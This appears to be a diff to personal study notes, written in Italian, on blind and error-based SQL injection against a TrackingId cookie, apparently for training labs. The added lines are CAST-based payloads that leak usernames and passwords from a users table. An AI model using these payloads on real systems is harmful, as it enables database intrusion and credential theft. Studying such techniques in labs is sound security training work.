@@ -117,6 +117,13 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' 
 
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'     -> da quali caratteri è composta la password
 
+
+TrackingId=xyz' AND CAST((SELECT 1) AS int)--         -> generic query che casta il valore di ritorno a int
+TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--       -> aggiungere 1= per risolvere errore di missing boolean sull'AND boolean
+TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--        
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   -> rimossi i caratteri del trackingid cookie per liberare spazio che generava errore e limitato a 1 il numero di righe di ritorno
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
 OAST techniques
 genera DNS query spesso
 con collaborator si monta un dns server e ricevere le risposte
